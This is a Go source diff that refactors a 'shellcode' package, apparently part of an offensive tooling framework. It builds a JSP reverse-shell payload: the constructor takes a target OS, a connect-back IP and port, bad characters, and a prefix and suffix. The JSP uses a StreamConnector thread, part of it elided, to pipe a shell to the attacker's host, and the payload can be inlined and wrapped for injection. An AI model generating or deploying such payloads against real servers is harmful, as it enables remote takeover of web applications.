@@ -1,14 +1,24 @@
 package shellcode
 
+import (
+    "fmt"
+    "strings"
+)
+
 type JavaShellCode struct {
     *ShellCodeBase
 }
 
-func NewJavaShellCode() *JavaShellCode {
-    return &JavaShellCode{}
+func NewJavaShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *JavaShellCode {
+    base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
+    return &JavaShellCode{base}
 }
 
-func (jsc *JavaShellCode) GetJSP(inline bool) string {
+func (jsc *JavaShellCode) GetJSP() (string, error) {
+    if err := jsc.Validate(); err != nil {
+        return "", err
+    }
+
     javaCode := `
     <%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>
             <%class StreamConnector extends Thread {
@@ -50,13 +60,24 @@ func (jsc *JavaShellCode) GetJSP(inline bool) string {
             }
             %>
     `
-    javaCode = jsc.GenShellCode(javaCode)
-    if inline {
-        javaCode = jsc.MakeInline(javaCode)
+    shellcode, err := jsc.GenShellCode(strings.TrimSpace(javaCode))
+    if err != nil {
+        return "", fmt.Errorf("generate java shellcode failed: %v", err)
     }
 
-    return javaCode
+    return shellcode, nil
 }
 
-func (jsc *JavaShellCode) GetShellCode() {}
+func (jsc *JavaShellCode) GetShellCode(inline bool) string {
+    shellcode, err := jsc.GetJSP()
+    if err != nil {
+        return ""
+    }
+
+    if inline {
+        shellcode = jsc.MakeInline(shellcode)
+    }
+
+    return fmt.Sprintf("%s%s%s", jsc.Prefix, shellcode, jsc.Suffix)
+}
 
